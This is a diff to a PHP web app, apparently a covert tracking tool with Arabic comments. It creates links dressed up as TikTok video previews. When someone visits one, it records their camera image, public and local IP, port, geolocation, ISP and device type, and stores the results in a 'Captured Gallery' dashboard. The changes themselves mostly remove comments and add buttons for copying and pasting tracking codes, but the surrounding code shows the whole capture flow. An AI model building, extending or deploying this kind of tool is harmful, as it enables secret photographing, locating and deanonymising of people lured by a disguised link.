@@ -1,22 +1,18 @@
 <?php
 date_default_timezone_set('Africa/Algiers');
 
-// منع ظهور الأخطاء للمستخدم النهائي
 error_reporting(0);
 @ini_set('display_errors', 0);
 
-// إنشاء مجلد الرفع إذا لم يكن موجوداً
 $upload_dir = 'uploads/';
 if (!is_dir($upload_dir)) {
     @mkdir($upload_dir, 0755, true);
 }
 
-// إعداد قاعدة البيانات وتحديث الجداول
 try {
     $db = new PDO('sqlite:tracker_enhanced_v2.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // جدول الروابط
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -27,7 +23,6 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // جدول السجلات مع إضافة حقل isp_info (نوع المتعامل)
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -36,7 +31,7 @@ try {
         local_ip TEXT, 
         port TEXT, 
         location TEXT, 
-        isp_info TEXT, -- حقل جديد لنوع المتعامل
+        isp_info TEXT, 
         device_info TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
@@ -44,7 +39,6 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة حذف سجل محدد
 if (isset($_GET['delete_id'])) {
     $del_id = intval($_GET['delete_id']);
     $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
@@ -53,7 +47,6 @@ if (isset($_GET['delete_id'])) {
     exit();
 }
 
-// دالة جلب معلومات تيك توك للمعاينة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
@@ -112,7 +105,6 @@ function fetch_tiktok_exclusive_meta($url) {
     return $meta;
 }
 
-// دالة جلب الـ IP الحقيقي
 function get_real_ip() {
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -121,12 +113,10 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// دالة جلب الموقع ومعلومات المتعامل (ISP)
 function get_ip_location_and_isp($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN'];
     }
-    // استخدام API لجلب الموقع واسم المتعامل
     @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp");
     if ($json) {
         $data = json_decode($json, true);
@@ -139,7 +129,6 @@ function get_ip_location_and_isp($ip) {
     return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP'];
 }
 
-// دالة تحديد نوع الجهاز
 function get_device_type($ua) {
     $brand = 'Device';
     if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
@@ -156,7 +145,6 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
-// معالجة زيارة الرابط المولد
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -194,15 +182,12 @@ if (isset($_GET['r'])) {
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
             
-            // جلب الموقع ومعلومات المتعامل
             $ip_details = get_ip_location_and_isp($public_ip);
             $location = $ip_details['location'];
-            $isp = $ip_details['isp']; // معلومات المتعامل
-            
+            $isp = $ip_details['isp'];
             $device = get_device_type($ua);
 
             try {
-                // حفظ البيانات بما فيها نوع المتعامل
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $isp, $device, date('Y-m-d H:i:s')]);
             } catch (Exception $e) {}
@@ -315,8 +300,8 @@ if (isset($_GET['r'])) {
     }
 }
 
-// معالجة إنشاء الرابط من لوحة التحكم
 $generated_link = "";
+$generated_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
     $use_camera = isset($_POST['use_camera']) ? 1 : 0;
@@ -335,6 +320,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
 
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
+    $generated_code = $code;
 }
 
 $filter_code = trim($_GET['track'] ?? '');
@@ -423,8 +409,8 @@ if (!empty($filter_code)) {
         .btn-success { background: var(--success); }
         .btn-success:hover { background: #059669; }
 
-        .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; }
-        .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); margin-bottom: 8px; letter-spacing: 0.05em; }
+        .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; display: grid; gap: 12px; }
+        .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); letter-spacing: 0.05em; }
         .flex-row { display: flex; gap: 8px; }
         
         .input-link-result { 
@@ -440,7 +426,7 @@ if (!empty($filter_code)) {
         
         .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
         .info-row span { color: #cbd5e1; }
-        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
+        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; cursor: pointer; }
 
         .btn-delete {
             display: block;
@@ -477,6 +463,23 @@ if (!empty($filter_code)) {
                 }, 2000);
             });
         }
+
+        // دالة لصق الرمز من الحافظة إلى خانة الفلترة
+        async function pasteCodeToFilter(btnElement) {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('trackCodeInput').value = text.trim();
+                const original = btnElement.innerText;
+                btnElement.innerText = "Pasted";
+                btnElement.style.background = "#059669";
+                setTimeout(() => {
+                    btnElement.innerText = original;
+                    btnElement.style.background = "";
+                }, 2000);
+            } catch (err) {
+                alert('يرجى السماح للمتصفح بالوصول إلى الحافظة أو لصق الرمز يدوياً.');
+            }
+        }
     </script>
 </head>
 <body>
@@ -502,10 +505,21 @@ if (!empty($filter_code)) {
 
             <?php if (!empty($generated_link)): ?>
                 <div class="result-panel">
-                    <label>Active Link:</label>
-                    <div class="flex-row">
-                        <input type="text" id="activeLink" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
-                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
+                    <div>
+                        <label>Active Link:</label>
+                        <div class="flex-row" style="margin-top: 6px;">
+                            <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                            <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
+                        </div>
+                    </div>
+                    
+                    <!-- خانة مستقلة خاصة بنسخ رمز التتبع وحده -->
+                    <div>
+                        <label>Tracking Code (رمز التتبع):</label>
+                        <div class="flex-row" style="margin-top: 6px;">
+                            <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="font-family: monospace; font-weight: bold; color: #a78bfa !important;">
+                            <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_code); ?>', this)">Copy Code</button>
+                        </div>
                     </div>
                 </div>
             <?php endif; ?>
@@ -513,13 +527,12 @@ if (!empty($filter_code)) {
 
         <div class="section-box">
             <h2>Captured Gallery & Details</h2>
-            <!-- تم إضافة زر نسخ رمز التتبع بجوار زر الفلترة -->
             <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
                 <input type="text" id="trackCodeInput" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; min-width: 200px;">
                 <div style="display: flex; gap: 8px;">
                     <button type="submit" class="btn" style="height:48px;">Filter</button>
-                    <!-- الزر الجديد لنسخ الرمز المكتوب -->
-                    <button type="button" class="btn btn-success" style="height:48px;" onclick="copyText(document.getElementById('trackCodeInput').value, this)">Copy Code</button>
+                    <!-- الزر الأخضر للـ لصق (Paste) -->
+                    <button type="button" class="btn btn-success" style="height:48px;" onclick="pasteCodeToFilter(this)">Paste Code</button>
                     <?php if(!empty($filter_code)): ?>
                         <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
                     <?php endif; ?>
@@ -543,7 +556,7 @@ if (!empty($filter_code)) {
                             <?php endif; ?>
 
                             <div class="info-row" style="margin-top:10px;">
-                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
+                                <span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars($cap['code']); ?>', this)" title="انقر لنسخ الرمز"><?php echo htmlspecialchars($cap['code']); ?> 📋</span>
                             </div>
                             <div class="info-row">
                                 <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
@@ -557,7 +570,6 @@ if (!empty($filter_code)) {
                             <div class="info-row">
                                 <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                             </div>
-                            <!-- عرض معلومات المتعامل الجديدة -->
                             <div class="info-row">
                                 <span>المتعامل:</span> <span style="color:#f97316;"><?php echo htmlspecialchars($cap['isp_info']); ?></span>
                             </div>
